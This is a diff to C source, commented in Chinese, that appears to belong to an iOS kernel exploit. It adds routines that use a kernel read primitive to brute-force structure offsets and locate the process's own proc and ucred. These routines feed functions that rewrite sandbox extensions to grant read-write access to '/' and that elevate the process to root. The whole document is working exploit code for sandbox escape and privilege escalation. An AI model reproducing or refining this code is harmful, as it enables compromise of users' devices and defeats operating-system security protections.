@@ -312,6 +312,175 @@ static uint64_t ds_discover_identities(void)
     return 0;
 }
 
+#pragma mark - 身份发现 v2（offset 组合穷举 + 四道校验 + 失败转储）
+
+typedef struct {
+    uint64_t labelOff;    // ucred → cr_label
+    uint64_t sandboxOff;  // label → sandbox
+    uint64_t extSetOff;   // sandbox → ext_set
+} ds_cred_offsets_t;
+
+static ds_cred_offsets_t gCredOff = { DS_OFF_UCRED_CR_LABEL, DS_OFF_LABEL_SANDBOX, DS_OFF_SANDBOX_EXT_SET };
+
+/// 把 cand 当成 ucred 来验：
+///   cand+labelOff → label（内核指针）
+///   label+sandboxOff → sandbox（内核指针）
+///   sandbox+extSetOff → ext_set（内核指针）
+///   ext_set 里至少有一个槽位能读出 ext 头，且 头+0x8 是内核指针
+/// 四道都过才认，并且把命中的 offset 组合回填，后面改写就用同一组。
+static bool ds_validate_ucred(uint64_t cand, ds_cred_offsets_t *out)
+{
+    static const uint64_t labelOffs[]   = { 0x78, 0x70, 0x80, 0x68, 0x88 };
+    static const uint64_t sandboxOffs[] = { 0x10, 0x08, 0x18, 0x20 };
+    static const uint64_t extSetOffs[]  = { 0x10, 0x08, 0x18, 0x20 };
+
+    for (int a = 0; a < 5; a++) {
+        uint64_t label = ds_kread_safe(cand + labelOffs[a]);
+        if (!ds_is_kaddr(label)) continue;
+
+        for (int b = 0; b < 4; b++) {
+            uint64_t sandbox = ds_kread_safe(label + sandboxOffs[b]);
+            if (!ds_is_kaddr(sandbox)) continue;
+
+            for (int c = 0; c < 4; c++) {
+                uint64_t extSet = ds_kread_safe(sandbox + extSetOffs[c]);
+                if (!ds_is_kaddr(extSet)) continue;
+
+                // 第四道：ext_set 里要有真正的 ext 链
+                bool extLooksRight = false;
+                for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
+                    uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
+                    if (!ds_is_kaddr(hdr)) continue;
+                    uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
+                    if (ds_is_kaddr(ext)) extLooksRight = true;
+                }
+                if (!extLooksRight) continue;
+
+                if (out) {
+                    out->labelOff = labelOffs[a];
+                    out->sandboxOff = sandboxOffs[b];
+                    out->extSetOff = extSetOffs[c];
+                }
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+/// 在某个内核对象的地址范围里扫「ucred 形状」的指针
+static uint64_t ds_scan_object_for_ucred(uint64_t base, uint64_t limit, const char *what)
+{
+    if (!ds_is_kaddr(base)) return 0;
+
+    ds_log("[逃逸] 在 %s(0x%llx) 的 0x0–0x%llx 里扫 ucred",
+           what, (unsigned long long)base, (unsigned long long)limit);
+
+    for (uint64_t off = 0; off < limit; off += 8) {
+        uint64_t raw = ds_kread_safe(base + off);
+        if (!raw) continue;
+
+        uint64_t cand = ds_normalize_ptr(raw);
+        if (!ds_is_kaddr(cand)) continue;
+
+        ds_cred_offsets_t offs;
+        if (ds_validate_ucred(cand, &offs)) {
+            gCredOff = offs;
+            ds_log("[逃逸] 命中：%s+0x%llx = ucred 0x%llx（cr_label@0x%llx label→sandbox@0x%llx sandbox→ext_set@0x%llx）",
+                   what, (unsigned long long)off, (unsigned long long)cand,
+                   (unsigned long long)offs.labelOff, (unsigned long long)offs.sandboxOff,
+                   (unsigned long long)offs.extSetOff);
+            return cand;
+        }
+    }
+    return 0;
+}
+
+/// 失败时把对象的原始字转储出来（只读同一对象内部，绝对安全），便于下一轮定位真实 offset
+static void ds_dump_words(const char *tag, uint64_t base, int words)
+{
+    if (!ds_is_kaddr(base)) return;
+    for (int i = 0; i < words; i += 4) {
+        char line[256];
+        int n = snprintf(line, sizeof(line), "[转储] %s+0x%03x:", tag, i * 8);
+        if (n < 0) continue;
+        for (int k = 0; k < 4 && (i + k) < words; k++) {
+            int m = snprintf(line + n, sizeof(line) - (size_t)n, " %016llx",
+                             (unsigned long long)ds_kread_safe(base + (uint64_t)(i + k) * 8));
+            if (m < 0) break;
+            n += m;
+        }
+        ds_log("%s", line);
+    }
+}
+
+static uint64_t ds_discover_identities_v2(void)
+{
+    if (gUcred) return gUcred;
+
+    // 漏洞自己就是用 rw_socket_pcb+0x40 当 socket 对象去改 refcount 的，这个锚点最可信
+    uint64_t socketObject = ds_kread_safe(g_ctx.rw_socket_pcb + DS_OFF_INPCB_INP_SOCKET);
+    if (!ds_is_kaddr(socketObject)) {
+        socketObject = ds_kread_safe(g_ctx.control_socket_pcb + DS_OFF_INPCB_INP_SOCKET);
+    }
+    if (ds_is_kaddr(socketObject)) {
+        gSelfSocketObject = socketObject;
+        ds_log("[逃逸] socket 对象 = 0x%llx（rw_socket_pcb+0x%llx）",
+               (unsigned long long)socketObject, (unsigned long long)DS_OFF_INPCB_INP_SOCKET);
+    }
+
+    // 路线一：socket → so_background_thread → thread → thread_ro → proc
+    if (ds_is_kaddr(socketObject)) {
+        const pid_t mypid = getpid();
+        const uint32_t pidOffsets[3] = { 0x60, 0x68, 0x58 };
+        for (uint64_t bgOff = 0x280; bgOff <= 0x300 && !gSelfProc; bgOff += 8) {
+            uint64_t thread = ds_kread_safe(socketObject + bgOff);
+            if (!ds_is_kaddr(thread)) continue;
+
+            for (uint64_t troOff = 0x300; troOff <= 0x4A0 && !gSelfProc; troOff += 8) {
+                uint64_t tro = ds_kread_safe(thread + troOff);
+                if (!ds_is_kaddr(tro)) continue;
+
+                uint64_t proc = ds_kread_safe(tro + DS_OFF_PROC_RO_TRO_PROC);
+                if (!ds_is_kaddr(proc)) continue;
+
+                for (int k = 0; k < 3; k++) {
+                    if ((pid_t)ds_kread32_safe(proc + pidOffsets[k]) != mypid) continue;
+                    gThreadTroOffset = troOff;
+                    gSelfProc = proc;
+                    ds_log("[逃逸] self proc 命中：so_bg_thread@0x%llx thread_t_tro@0x%llx p_pid@0x%x proc=0x%llx",
+                           (unsigned long long)bgOff, (unsigned long long)troOff, pidOffsets[k],
+                           (unsigned long long)proc);
+                    break;
+                }
+            }
+        }
+    }
+
+    // 路线二：proc → proc_ro → ucred
+    if (gSelfProc) {
+        uint64_t procRo = ds_kread_safe(gSelfProc + DS_OFF_PROC_RO);
+        uint64_t ucred = ds_scan_object_for_ucred(procRo, 0x60, "proc_ro");
+        if (ucred) { gUcred = ucred; return ucred; }
+        ds_log("[逃逸] proc 找到了但 proc_ro 里没有 ucred（proc_ro=0x%llx）", (unsigned long long)procRo);
+    } else {
+        ds_log("[逃逸] 没找到 self proc（so_background_thread 在 0x280–0x300 全是非指针）");
+    }
+
+    // 路线三：直接扫 socket 对象里引用的 ucred（同一个 cred 对象，改它的 label 一样能开沙盒）
+    if (ds_is_kaddr(socketObject)) {
+        uint64_t ucred = ds_scan_object_for_ucred(socketObject, 0x800, "socket");
+        if (ucred) { gUcred = ucred; return ucred; }
+    }
+
+    // 全失败：转储关键对象，下一轮照着实测数据改 offset（只读同一对象内部，安全）
+    ds_log("[逃逸] 三条路线都没命中，转储关键对象供定位：");
+    ds_dump_words("rw_pcb", g_ctx.rw_socket_pcb, 0x20);
+    if (ds_is_kaddr(socketObject)) ds_dump_words("socket", socketObject, 0x60);
+    ds_log("[逃逸] 转储结束");
+    return 0;
+}
+
 #pragma mark - 改写沙盒扩展
 
 /// 把扩展数据里的路径改成 "/"，并把长度/哈希字段填成「永远有效」
@@ -364,12 +533,12 @@ static int ds_patch_chain(uint64_t header, const char *rwClass)
 
 static int DSEscapeSandboxInternal(void)
 {
-    uint64_t ucred = ds_discover_identities();
+    uint64_t ucred = ds_discover_identities_v2();
     if (!ucred) return -2;
 
-    uint64_t label = ds_kread_safe(ucred + DS_OFF_UCRED_CR_LABEL);
-    uint64_t sandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
-    uint64_t extSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
+    uint64_t label = ds_kread_safe(ucred + gCredOff.labelOff);
+    uint64_t sandbox = ds_kread_safe(label + gCredOff.sandboxOff);
+    uint64_t extSet = ds_kread_safe(sandbox + gCredOff.extSetOff);
     if (!ds_is_kaddr(extSet)) return -2;
 
     const char *rwClass = "com.apple.app-sandbox.read-write";
@@ -453,7 +622,7 @@ int DSEscapeElevateToRoot(ds_escape_log_fn log)
         return 0;
     }
 
-    uint64_t ucred = ds_discover_identities();
+    uint64_t ucred = ds_discover_identities_v2();
     if (!ucred) { gLog = NULL; return -2; }
 
     uint64_t posix = ucred + DS_OFF_UCRED_POSIX;
